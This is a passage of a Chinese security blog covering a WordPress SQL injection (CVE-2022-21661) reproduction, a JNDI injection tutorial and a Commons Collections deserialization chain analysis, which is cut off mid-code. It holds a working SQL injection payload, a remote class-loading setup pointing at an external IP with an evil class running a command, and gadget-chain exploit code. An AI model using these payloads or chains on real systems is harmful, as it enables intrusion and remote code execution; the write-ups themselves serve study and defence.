<p>前面的分析都是介绍如何一步一步执行到<code>get_sql_for_clause</code>这个函数，并且介绍了传入这个函数的变量是如何控制的。接下来就是该漏洞点主要的部分。</p>
<p>​    在<code>get_sql_for_clause</code>这个函数中，调用了<code>clean_query</code>方法对我们构造的数据进行了一个清洗，然后取出其中的<code>terms</code>值，带入了<code>SQL</code>拼接语句中，<code>payload</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=1) or updatexml(0x7e,concat(1,user()),0x7e)#&amp;query_vars[tax_query][1][field]=term_taxonomy_id</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119162842107.png" alt="image-20220119162842107"></p>
<h2 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h2><p>​    我这里将<code>new WP_Query($_POST[&#39;query_vars&#39;])</code>语句放置到<code>wp-admin\admin-ajax.php</code>中：（在实际场景下，只要该处输入可控，即可造成<code>SQL</code>注入漏洞）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119163052340.png" alt="image-20220119163052340"></p>
<p>​    复现的时候开启一下<code>debug</code>即可看见报错注入（也可以进行盲注了）；最后的构造语句为：（这里加上<code>action</code>参数是为了执行到目标代码）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=aa&amp;query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=1) or updatexml(0x7e,concat(1,user()),0x7e)#&amp;query_vars[tax_query][1][field]=term_taxonomy_id</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119162842107.png" alt="image-20220119162842107"></p>
<h2 id="四、修复方式"><a href="#四、修复方式" class="headerlink" title="四、修复方式"></a>四、修复方式</h2><p>​    官网已经发布更新版本，或者按照官网的修复方式，自行添加代码：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114152416687.png" alt="image-20220114152416687"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/" data-id="cl8h2gj930004fgdp8uf8dink" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Java安全---JNDI注入解析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/" class="article-date">
  <time datetime="2022-03-31T02:05:06.000Z" itemprop="datePublished">2022-03-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Java安全—JNDI注入解析"><a href="#Java安全—JNDI注入解析" class="headerlink" title="Java安全—JNDI注入解析"></a><code>Java</code>安全—<code>JNDI</code>注入解析</h1><h2 id="一、什么是JNDI"><a href="#一、什么是JNDI" class="headerlink" title="一、什么是JNDI"></a>一、什么是<code>JNDI</code></h2><p>​    <code>JNDI</code>全称为<code>Java</code>命名和目录接口。我们可以理解为<code>JNDI</code>提供了两个服务，即命名服务和目录服务。</p>
<p>​    命名服务将一个对象和一个名称进行绑定，然后放置到一个容器里面。当我们想要获取这个对象的时候，就可以通过容器来查找这个名称，从而获得这个对象。</p>
<p>​    目录服务就是将一些对象的属性放置到容器中，然后想要操作这个属性的时候，就通过容器来进行查找。</p>
<p>​    对比一下命名服务和目录服务，其实命名服务就是绑定对象，而目录服务就是绑定了对象的属性。在<code>JNDI</code>中，命名服务和目录服务是一起结合提供的，最容易理解的一个例子就是<code>RMI</code>。</p>
<p>​    在<code>RMI</code>的服务端，通常我们会将一个远程对象和一个名称进行绑定，然后将其注册到注册表里面。除了通过<code>RMI</code>来实现客户端从而获取到对象之外，还可以使用<code>JNDI</code>来获取对象。<code>JNDI</code>其实就是对这些提供了命名服务或者目录服务的逻辑进行了一个封装，例如上面的<code>RMI</code>，我们可以直接调用<code>JNDI</code>提供的<code>lookup</code>函数来远程获取，例如：<code>lookup(&quot;rmi://127.0.0.1/bind&quot;)</code>；如果提供服务的是<code>LDAP</code>，我们同样可以通过<code>lookup(&quot;ldap://127.0.0.1/&quot;)</code>来进行访问。</p>
<p>​    通过上面这个例子，不难看出<code>JNDI</code>其实就是对这些服务的访问做了一个统一的处理。</p>
<h2 id="二、JNDI的简单实践"><a href="#二、JNDI的简单实践" class="headerlink" title="二、JNDI的简单实践"></a>二、<code>JNDI</code>的简单实践</h2><p>​    通过上面的介绍，我们知道，想要实现<code>JNDI</code>，我们首先得需要一个容器，然后我们将一个对象绑定到容器里面。（这里结合<code>RMI</code>来实现一个简单的示例）</p>
<h3 id="1、创建一个远程调用对象"><a href="#1、创建一个远程调用对象" class="headerlink" title="1、创建一个远程调用对象"></a>1、创建一个远程调用对象</h3><p>​    首先创建一个接口，继承<code>Remote</code>接口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface RemoteMethod extends Remote &#123;</span><br><span class="line">    public void sayBye() throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    创建一个远程对象，实现该接口，并继承<code>UnicastRemoteObject</code>类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class M1sn0w extends UnicastRemoteObject implements RemoteMethod &#123;</span><br><span class="line">    public String name;</span><br><span class="line">    public int age;</span><br><span class="line">    public M1sn0w(String name,int age) throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.age = age;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    public void sayBye()&#123;</span><br><span class="line">        System.out.println(&quot;say bye!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2、开启RMI服务端"><a href="#2、开启RMI服务端" class="headerlink" title="2、开启RMI服务端"></a>2、开启<code>RMI</code>服务端</h3><p>​    创建一个<code>RMI</code>服务端，并将一个远程对象绑定到注册表中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">        M1sn0w m1sn0w = new M1sn0w(&quot;m1sn0w&quot;,22);</span><br><span class="line">        LocateRegistry.createRegistry(1099);</span><br><span class="line">        Naming.bind(&quot;m1sn0w&quot;,m1sn0w);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3、利用JNDI远程获取对象"><a href="#3、利用JNDI远程获取对象" class="headerlink" title="3、利用JNDI远程获取对象"></a>3、利用<code>JNDI</code>远程获取对象</h3><p>​        我们想要使用<code>JNDI</code>来远程获取对象，首先得需要获取一个容器，我们先看如下实例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class jndi &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NamingException &#123;</span><br><span class="line">        Properties env = new Properties();</span><br><span class="line">      env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">        env.put(Context.PROVIDER_URL,&quot;rmi://127.0.0.1:1099&quot;);</span><br><span class="line">        Context ctx = new InitialContext(env);</span><br><span class="line">        RemoteMethod remoteMethod = (RemoteMethod) ctx.lookup(&quot;m1sn0w&quot;);</span><br><span class="line">        remoteMethod.sayBye();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>Context.PROVIDER_URL</code>参数表示指定一个远程加载的地址，例如上面的<code>rmi://127.0.0.1:1099</code>，当我们通过<code>lookup</code>函数进行查找对象的时候，其实就是在<code>rmi://127.0.0.1:1099/m1sn0w</code>这个里面进行的查找。</p>
<p>​    最后远程调用方法之后，会在服务端执行代码，将结果返回给<code>JNDI</code>客户端。</p>
<h2 id="三、JNDI注入漏洞"><a href="#三、JNDI注入漏洞" class="headerlink" title="三、JNDI注入漏洞"></a>三、<code>JNDI</code>注入漏洞</h2><p>​    通过上面的这个例子，我们可以知道，通过<code>JNDI</code>可以远程加载对象。除了通过上面的<code>Context.PROVIDER_URL</code>来设置<code>URL</code>以外，我们可以直接在<code>lookup</code>参数指定<code>URL</code>，例如<code>lookup(&quot;rmi://127.0.0.1:1099/m1sn0w&quot;)</code>，由于<code>JNDI</code>存在一个动态地址转换协议，也就是说当我们在<code>lookup</code>上指定一个<code>URL</code>的时候，就会优先于<code>Context.PROVIDER_URL</code>的设置进行加载。</p>
<p>​    至此，就可以想到，如果这个<code>lookup</code>参数可控的话，那么我们就可以传入恶意的<code>url</code>地址来控制受害者加载攻击者指定的恶意类。但是这里又会遇到一个问题，就是怎么进行攻击呢？</p>
<p>​    当我们指定一个恶意的<code>URL</code>地址之后，受害者在获取完这个远程对象之后，开始调用恶意方法。但是在<code>RMI</code>中，调用远程方法，最终的执行是服务端去执行。只是把最终的结果以序列化的形式传递给客户端，也就是这里所说的受害者。当然，如果受害者内部存在漏洞组件存在反序列化漏洞的话，我们可以构造恶意的序列化对象，返回给客户端，当客户端在进行反序列化的时候，可以触发漏洞；如果目标组件不存在反序列化漏洞，我们返回一个恶意对象，但是客户端本地没有这个<code>class</code>文件，当然也就不能成功获取到这个对象。</p>
<h2 id="四、Reference类"><a href="#四、Reference类" class="headerlink" title="四、Reference类"></a>四、<code>Reference</code>类</h2><p>​    为了解决上面这个问题，我们引入了一个<code>Reference</code>类，这个类表示对存在于命名或者目录系统以外的对象的引用。简单理解一下，就是如果<code>RMI</code>服务端返回的是一个<code>Reference</code>对象或者其子类对象的话，当客户端获取远程对象<code>Stub</code>的时候，我们就可以指定客户端从一个具体的服务端上去加载<code>class</code>文件从而完成这个类的实例化。</p>
<p>​    <code>Reference</code>类实例化需要三个参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">className：表示远程加载时所使用的类名</span><br><span class="line">classFactory：加载class中需要实例类的名称</span><br><span class="line">classFactoryLocation：指定远程加载类的地址</span><br></pre></td></tr></table></figure>

<p>​    例如我们创建如下<code>Reference</code>类实例，并将其绑定到注册表中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException, RemoteException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">        Reference reference = new Reference(&quot;111&quot;,&quot;evil&quot;,&quot;http://148.70.205.134:8080/&quot;);</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</span><br><span class="line">        LocateRegistry.createRegistry(1099);</span><br><span class="line">        Naming.bind(&quot;m1sn0w&quot;,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    然后编写一个<code>evil.java</code>恶意类，编译之后，将<code>evil.class</code>上传到服务器上：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">public class evil &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    之后使用<code>JNDI</code>来远程获取这个绑定的对象，最终会在本地弹出计算器框：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        Properties env = new Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">        env.put(Context.PROVIDER_URL,&quot;rmi://127.0.0.1:1099&quot;);</span><br><span class="line">        Context ctx = new InitialContext(env);</span><br><span class="line">        ctx.lookup(&quot;m1sn0w&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211228115153229.png" alt="image-20211228115153229"></p>
<p>​    这里有几个坑需要注意一下：</p>
<p>​    1、首先就是<code>jdk</code>的版本，后面我们会再提，高版本的<code>jkd</code>做了限制，因此实验使用<code>jkd1.7</code>版本</p>
<p>​    2、恶意类中不要带<code>package</code>包名，否则可能会报错</p>
<p>​    我们梳理一下整个调用流程。首先我们创建了一个<code>Reference</code>实例对象，这三个参数表示的意思为：当远程加载对象之后，会先从本地找<code>111.class</code>文件是否存在，如果不存在，则从远程服务端<code>http://148.70.205.134:8080</code>中查找<code>evil.class</code>文件。接下来使用了<code>ReferenceWrapper</code>来包裹<code>Reference</code>是，原因是远程对象需要继承<code>UnicastRemoteObject</code>类，而<code>Reference</code>类并没有对该类进行继承，因此我们需要封装一下，跟进<code>ReferenceWrapper</code>类，可以发现其继承了<code>UnicastRemoteObject</code>类：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211228115847357.png" alt="image-20211228115847357"></p>
<p>​    到此，我们对<code>JNDI</code>注入攻击有了一个大致的了解。对于<code>JNDI</code>注入漏洞，我们的攻击方式如下：（利用<code>RMI</code>）</p>
<p>​    1、在存在注入的地方利用<code>RMI</code>远程加载，指向恶意的<code>URL</code></p>
<p>​    2、我们在恶意的<code>URL</code>上搭建一个<code>RMI</code>服务，并绑定一个<code>Reference</code>对象，并指定恶意类的加载路径</p>
<p>​    3、在服务端上放置恶意类编译后的<code>class</code>文件</p>
<h2 id="五、官网修复策略"><a href="#五、官网修复策略" class="headerlink" title="五、官网修复策略"></a>五、官网修复策略</h2><p>最后我们来看一下，针对不同的<code>JDK</code>版本，官方给出了一些限制：</p>
<p>1、<code>JDK 6u45、7u21</code>之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为<code>true</code>，表示禁用自动加载远程类文件。</p>
<p>2、<code>JDK 6u141、7u131、8u121</code>之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为<code>false</code>，禁止<code>RMI</code>和<code>CORBA</code>协议使用远程<code>codebase</code>的选项。</p>
<p>3、<code>JDK 6u211、7u201、8u191</code>之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止<code>LDAP</code>协议使用远程<code>codebase</code>的选项</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/" data-id="cl8h2gj940005fgdp6abdc76p" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Java CC链1-5分析与总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2022-03-30T03:23:50.000Z" itemprop="datePublished">2022-03-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Java-CC链1-5分析与总结"><a href="#Java-CC链1-5分析与总结" class="headerlink" title="Java CC链1-5分析与总结"></a>Java CC链1-5分析与总结</h1><p>前言：在ysoserial工具中，CommonsCollection反序列化链一共有7条，本文对这七条链做一个分析与调试，并找出其中的相似点与不同点，最后给出自己的一些思考。（有时候，思路比细节更重要）</p>
<h2 id="一、CommonsCollection1链"><a href="#一、CommonsCollection1链" class="headerlink" title="一、CommonsCollection1链"></a>一、CommonsCollection1链</h2><p>   正常情况下，如果想要调用Runtime来执行任意命令，需要调用其静态方法getRuntime来获取一个实例对象，然后再调用其exec来执行命令。如果我们想通过反射的方式来进行调用，具体过程如下：</p>
<ul>
<li>通过反射获取getRuntime静态方法</li>
<li>调用getRuntime方法获取一个Runtime实例对象</li>
<li>通过反射获取exec方法，并将获取到的Runtime实例对象传入进行调用</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(clazz);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">method1.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  除了使用Runtime之外，还可以利用ProcessBuilder来执行命令，具体实现如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor(String[].class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">method.invoke(object);</span><br></pre></td></tr></table></figure>

<p>​      </p>
<p>  在CommonsCollection1链中，会调用到三个不同类的transformer方法，但最终利用到的是InvokerTransformer的transform方法，其方法具体实现如下：（这里删掉了部分异常语句）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">	<span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">	<span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">	<span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  其中iMethodName、iParamTypes、iArgs变量是该类的成员变量。在反序列化漏洞中，我们可以理解为，这三个变量是我们可以进行控制的。上面这个transformer方法，我们可以理解其功能为调用传入的input对象的任意public方法或者其静态方法。</p>
<p>  接下来看看ChainedTransformer类的transformer方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 这里的关键就在于object变量，可以通过for循环来不断地更新。根据ysoserial上给出的Gadgets链，我们知道是LazyMap的get方法调用了这个transformer方法；我们继续向上追溯，在AnnotationInvocationHandler的invoke方法，通过调用this.memberValues.get(var4)方法，最终去触发LazyMap的get方法，而这里的var4变量为字符串。也就是说，我们最终传入transformer方法中的参数是不可控的。</p>
<p>   因此，这里又引入了另外一个类的transformer方法，即ConstantTransformer：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  这里的iConstant是成员变量，可控的。因此我们可以构造如下代码，当其调用ChainedTransformer的transformer方法后，不论传入的参数是任何值，都可以执行任意命令：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(runtime);</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">	constantTransformer,<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  但是这里又有一个问题，Runtime类并没有实现Serializable接口，因此直接这样进行序列化和反序列化是不行的。解决这个问题就是采用反射的方式，来生成一个Runtime对象。（个人认为这也就是为什么反射在序列化过程中使用的比较多的一个原因吧，可能绝大多数的利用类都没有实现Serializable接口）</p>
<p>  接下来我们对上面这段代码进行修改，让其通过反射来生成一个Runtime对象，并最终达到命令执行的效果：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">          constantTransformer,</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  到这里，CC1链的核心部分就构造完成了，接下来要做的就是寻找调用链，让其最终可以调用到transform方法。</p>
<p>  前面说到过，LazyMap的get方法会调用到transform方法，我们继续向上追溯，可以发现在AnnotationInvocationHandler的invoke方法中调用了this.memberValues.get(var4)方法，这里就很容易想到动态代理了，在AnnotationInvocationHandler的readObject中，会调用到this.memberValues.entrySet方法，我们将这个this.memberValues设置成Map的代理对象，就可以构造整条链了，具体过程如下：</p>
<ul>
<li>先构造一个Map的代理对象</li>
<li>将其封装到AnnotationInvocationHandler的this.memberValues成员变量中</li>
<li>调用AnnotationInvocationHandler的readObject之后，会调用我们构造的代理类的invoke方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个动态代理对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),invocationHandler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将代理对象封装到AnnotationInvocationHandler中</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz1.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler1</span> <span 